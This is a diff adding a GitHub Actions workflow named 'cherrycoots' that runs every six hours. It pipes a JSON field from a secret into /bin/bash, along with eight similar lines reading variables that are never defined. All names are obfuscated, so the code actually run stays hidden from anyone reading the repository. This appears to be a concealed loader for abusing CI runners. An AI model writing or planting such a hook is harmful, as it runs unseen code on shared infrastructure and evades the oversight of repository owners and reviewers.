@@ -1,0 +1,27 @@
+name: cherrycoots
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cherrycoots
+        env:
+          z313: ${{ secrets.z313 }}
+        run: |
+          echo $z313 | jq -r .yym0613 | /bin/bash
+          echo $q0592 | jq -r .pask60890 | /bin/bash
+          echo $riupa4510 | jq -r .mwj93 | /bin/bash
+          echo $dubc39 | jq -r .yvi42 | /bin/bash
+          echo $jrasg898 | jq -r .d31603 | /bin/bash
+          echo $lbauj006 | jq -r .dzffu726 | /bin/bash
+          echo $b553 | jq -r .b4014 | /bin/bash
+          echo $ti1859 | jq -r .zz968 | /bin/bash
+          echo $xgg05 | jq -r .jwsks065 | /bin/bash
+
